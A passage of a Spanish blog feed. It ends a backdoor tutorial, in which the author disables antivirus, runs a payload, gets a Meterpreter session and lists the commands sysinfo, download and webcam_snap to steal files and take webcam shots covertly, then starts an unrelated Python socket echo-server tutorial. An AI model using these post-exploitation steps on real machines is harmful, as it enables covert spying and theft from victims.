&lt;p&gt;Solo queda instalar el programa malicioso en el equipo correspondiente. Desactivo los antivirus e inicio el programa.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/backdoor-en-pc.png&quot; width=&quot;70%&quot; /&gt;
&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/proteccion-windows.png&quot; width=&quot;70%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como vemos, nos ha saltado una alerta de windows diciendo que el programa podría ser peligroso, &lt;strong&gt;lo ejecutamos de todas formas&lt;/strong&gt; ¡y listo! Sistema comprometido. Desde el punto de vista de la víctima, no ha pasado absolutamente nada… Pero desde el punto de vista del atacante, hemos conseguido el acceso completo.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/meterpreter-iniciado.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Vamos a trastear un poco y ver qué podemos hacer…&lt;/p&gt;

&lt;h2 id=&quot;fase-de-acción&quot;&gt;Fase de acción&lt;/h2&gt;
&lt;p&gt;Para obtener información sobre el sistema en el que estamos, usamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/sysinfo.png&quot; width=&quot;60%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Bien, como tenemos el control completo nos podemos mover entre los archivos. Para descargar un archivo, utilizaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;download &amp;lt;archivo&amp;gt;&lt;/code&gt;. Descargaremos esta foto que se encuentra en la carpeta de Descargas&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/download.png&quot; width=&quot;70%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Hemos conseguido descargar en nuestro equipo la foto, qué bonitos :D&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/gatitos.png&quot; width=&quot;80%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;También podremos acceder a la webcam, mediante el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webcam_snap -c 1&lt;/code&gt;. Esto no lo podré demostrar dado que no tengo webcam, pero pruébalo tú mismo.&lt;/p&gt;

&lt;p&gt;Como vemos, se puede hacer cualquier cosa… A partir de aquí toca buscarse la vida: convertir la sesión meterpreter en una Shell, migración de procesos… Sé creativo ;)&lt;/p&gt;

&lt;p class=&quot;notice--danger&quot;&gt;Aviso: Realizar siempre en entornos controlados y con el consentimiendo de la persona. El incumplimiento de esto puede llevar a acciones legales.&lt;/p&gt;</content><author><name>r4kso</name></author><category term="Tutoriales" /><category term="Tutoriales" /><category term="Redes" /><category term="Backdoors" /><category term="msfvenom" /><summary type="html">En este post te enseñaré cómo crear un backdoor, técnicas básicas para esconderlo y el funcionamiento desde el punto de vista del atacante y de la víctima. Podrás ver cómo se accede a su webcam, archivos...</summary></entry><entry><title type="html">Qué es un socket y cómo funciona</title><link href="http://localhost:4000/que-es-un-socket-y-como-funciona/" rel="alternate" type="text/html" title="Qué es un socket y cómo funciona" /><published>2021-04-16T00:00:00+01:00</published><updated>2021-04-16T00:00:00+01:00</updated><id>http://localhost:4000/que-es-un-socket-y-como-funciona</id><content type="html" xml:base="http://localhost:4000/que-es-un-socket-y-como-funciona/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/que-es-un-socket-y-como-funciona/portada.png&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Si tienes prisa, un &lt;strong&gt;&lt;em&gt;socket&lt;/em&gt;&lt;/strong&gt; se puede definir rápidamente como un &lt;strong&gt;“dispositivo” virtual&lt;/strong&gt; generado por el sistema operativo a través del cual puedes &lt;strong&gt;enviar y recibir información de otros procesos&lt;/strong&gt; que también se comuniquen mediante &lt;em&gt;sockets&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Aunque claro, esta definición se queda un poco corta…&lt;/p&gt;
&lt;h2 id=&quot;qué-es-un-socket---explicación-larga&quot;&gt;¿Qué es un socket? - Explicación larga&lt;/h2&gt;
&lt;p&gt;Podría hablarte de la historia y de por qué se crearon, pero si quieres saber eso te dejo este enlace por &lt;a href=&quot;https://dosideas.com/noticias/actualidad/574-pasado-presente-y-futuro-de-los-sockets&quot;&gt;aquí&lt;/a&gt;. Lo que realmente queremos saber es &lt;em&gt;qué es un socket&lt;/em&gt; y &lt;em&gt;cómo funciona&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Pues bien, como dije anteriormente un socket es un “”””&quot;”dispositivo””””” (nótese las comillas) virtual generado por el sistema operativo. ¿Qué quiero decir con esto? Pues que un &lt;em&gt;socket&lt;/em&gt; realmente es un concepto abstracto que irá definido por la dirección IP y un puerto.&lt;/p&gt;

&lt;p&gt;Un &lt;em&gt;socket&lt;/em&gt; pertenece a un proceso y sirve como medio de comunicación entre otro proceso (sea que esté ejecutandose en la misma máquina u otra en tu misma red local o conectada a Internet). Esto nos permite intercambiar información. Para hacer esto posible existen algunos protocolos como TCP o UDP (en el ejemplo práctico usaremos TCP ya que es el más común).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;UDP (User Datagram Protocol) es un protocolo  &lt;strong&gt;SIN CONEXION&lt;/strong&gt;, es decir, envía paquetes sin llegar a conectarse al destino para así maximizar la velocidad de transmisión de información (en este caso la información se envía en &lt;strong&gt;datagramas&lt;/strong&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;TCP (Transmission Control Protocol) este protocolo es &lt;strong&gt;CON CONEXION&lt;/strong&gt;, lo que garantiza que los paquetes serán entregados en su destino sin errores y en el mismo orden que en el que se emitieron.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/que-es-un-socket-y-como-funciona/img1.jpeg&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En este esquema hay 2 ordenadores con su dirección IP propia (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;174.123.241.13&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;142.250.134.127&lt;/code&gt;). En cada ordenador se ejecuta un proceso (A y B) que hacen uso de los puertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5834&lt;/code&gt; respectivamente. Como hemos dicho antes, cada socket será identificado por su IP y su puerto.&lt;/p&gt;

&lt;p&gt;Así pues el socket A será: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;174.123.241.13:8000&lt;/code&gt; y el socket B será: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;142.250.134.127:5834&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;ejemplo-práctico---echo-server&quot;&gt;Ejemplo práctico - Echo server&lt;/h2&gt;
&lt;p&gt;Ahora que conocemos qué es un socket, vamos a ver cómo funcionan a en la práctica (lo haremos en python).&lt;/p&gt;

&lt;p&gt;Un echo server consiste en mandarle una información al servidor y recibir a través de ese servidor lo mismo que tú has enviado (el equivalente al comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; en una terminal linux).&lt;/p&gt;

&lt;p&gt;Para ello, necesitaremos crear el servidor (socket A) y el cliente (socket B).&lt;/p&gt;
&lt;h3 id=&quot;servidor&quot;&gt;SERVIDOR&lt;/h3&gt;
&lt;p&gt;Antes de nada, para mayor comodidad definiremos 2 constantes: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HOST&lt;/code&gt; que almacenará la dirección IP que usaremos y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PORT&lt;/code&gt; que almacenará el puerto que usaremos. Importamos previamente la libreria &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket&lt;/code&gt; ya que posteriormente la necesitaremos.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# Localhost
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5346&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;La dirección IP que aparece en HOST es la de &lt;em&gt;localhost&lt;/em&gt;, ya que buscamos trabajar en local. El puerto escogido ha sido uno aleatorio. Existen un total de 65536 puertos, aunque los primeros 1024 se encuentran reservados para el uso del sistema. Estos pueden usarse aunque no es recomendable ya que podríamos interferir con algún otro proceso.&lt;/p&gt;

&lt;p&gt;Ahora, ya con la librería importada, crearemos un socket mediante la clase &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket&lt;/code&gt;. Utilizamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with&lt;/code&gt; ya que posteriormente lo necesitaremos para seguir definiendo el código.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# A partir de ahora el socket será nombrado como &quot;s&quot;
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# Continuaremos el código a partir del &quot;with&quot;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Con el primer parámetro indicamos la &lt;strong&gt;familia de dirección&lt;/strong&gt; (AddressFamily.INternET) que en este caso es IPv4 (si usaramos IPv6 deberíamos cambiarlo por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket.AF_INET6&lt;/code&gt;). Con el segundo parámetro indicamos el tipo de protocolo que usaremos para la transferencia de información, que en este caso será TCP.&lt;/p&gt;

&lt;p&gt;Ahora llamamos a la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bind&lt;/code&gt; de la clase socket. Con esta función podremos indicar al socket a qué dirección IP pertenece y en qué puerto deberá estar escuchando.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez que el socket ha sido configurado, hacemos que espere a la conexión de otro socket.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Esto hará que el programa se quede pausado en ese punto, hasta que otro socket se intente conectar, cumpliendo así las características de un servidor.&lt;/p&gt;

&lt;p&gt;Cuando ocurra un intento de conexión, el servidor la acepta automáticamente mediante el método de la clase socket &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accept()&lt;/code&gt;. Este método devuelve &lt;strong&gt;otro socket&lt;/strong&gt; (importante) que contiene la información socket que se ha conectado y también devuelve su dirección, que almacenaremos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csocket&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caddress&lt;/code&gt; respectivamente.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ahora que disponemos de la información del socket cliente, recibimos la información que nos envíe y se la reenviamos:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connected by : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;# Imprime la dirección del cliente
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                 &lt;span class=&quot;c1&quot;&gt;# Lee los datos enviados por el cliente
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;                                        
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                &lt;span class=&quot;c1&quot;&gt;# En caso de que no queden datos por leer, terminamos.    
&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;# Le devuelve los datos al cliente
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;En los comentarios se encuentra explicado qué hace línea, aunque viene bien resaltar que cuando llamamos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv()&lt;/code&gt;, pasamos el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1024&lt;/code&gt; para indicar el tamaño del buffer, es decir, la cantidad de bytes que puede leer. Si el mensaje fuera más grande, podríamos aumentar su tamaño.&lt;/p&gt;

&lt;p&gt;El bucle está hecho para poder leer todos los datos que envíe el cliente. Una vez los haya leído todos, sale del bucle y finaliza. En este caso no hace falta cerrar el socket con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.close()&lt;/code&gt; ya que al finalizar el propio “with” este se cierra automáticamente gracias a que anteriormente creamos el socket mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket.socket()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pues con esto &lt;strong&gt;hemos finalizado el código del servidor&lt;/strong&gt;. Crea el socket, lo configura, espera por una conexión, se conecta, recibe los datos y los envía. Un servidor en toda regla ;)&lt;/p&gt;

&lt;p&gt;CÓDIGO COMPLETO:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Localhost
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5346&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# Parameters specify the address family and the socket type. Using &quot;with&quot; there is no need to call s.close()
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;                                        &lt;span class=&quot;c1&quot;&gt;# Associate the socket to a specific network interface and port number
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;                                                  &lt;span class=&quot;c1&quot;&gt;# Enable the socket to accept connectios. It makes it a listening socket.
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;# Blocks and waits for an incoming connection. Get a new socket object.
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connected by : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                      &lt;span class=&quot;c1&quot;&gt;# Prints the name of the client
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                           &lt;span class=&quot;c1&quot;&gt;# Read the data from the client
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;                
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                          &lt;span class=&quot;c1&quot;&gt;# When there is no more data, we finish
&lt;/span&gt;            
            &lt;span class=&quot;n&quot;&gt;csocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;# Return the data to de client
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;PD: Los comentarios en inglés para cumplir con las buenas prácticas&lt;/p&gt;
&lt;h3 id=&quot;cliente&quot;&gt;CLIENTE&lt;/h3&gt;
&lt;p&gt;El cliente es algo más sencillo que el servidor, ya que solo debemos conectarnos y enviar la información. Ahora que ya hemos hecho el servidor, este será pan comido.&lt;/p&gt;

&lt;p&gt;En primer lugar importamos la librería socket y creamos las constantes. No necesitamos indicar el puerto y la IP del socket que vamos a crear ahora ya que no nos afecta en nada, será generado de forma aleatoria a conveniencia del sistema operativo. Lo que si necesitamos saber es la IP del servidor y su puerto, es por ello que las almacenamos en las constantes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHOST&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SPORT&lt;/code&gt; respectivamente.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;SHOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# Server IP
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5346&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;# Server port
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Creamos el socket al igual que hicimos en el servidor.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Aquí continuará el código
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y ahora hacemos una solicitud de conexión con el servidor.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SPORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez conectados, le enviamos los datos que queramos. Yo enviaré un simple “hello world”.&lt;/p&gt;
